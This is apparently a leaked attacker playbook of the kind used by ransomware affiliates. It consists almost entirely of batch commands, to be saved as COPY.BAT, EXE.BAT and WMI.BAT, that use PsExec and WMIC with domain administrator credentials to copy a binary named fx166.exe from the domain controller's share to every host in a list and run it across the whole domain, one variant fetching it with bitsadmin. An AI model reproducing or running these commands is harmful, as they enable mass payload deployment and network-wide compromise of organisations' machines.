# COLLECTING A DOMAIN FOR COPYING A FILE
```
start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\PRIMARY ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe" "C:\windows\temp\"
```
WE SAVE AS "COPY.BAT"

# COLLECTING A DOMAIN TO RUN A FILE
```
start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
```
WE SAVE AS "EXE.BAT"

# COLLECTING WMI DATABASE FOR COPYING AND RUNNING A FILE ALL OVER THE DOMAIN
```
start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe"
```
WE SAVE AS "WMI.BAT"
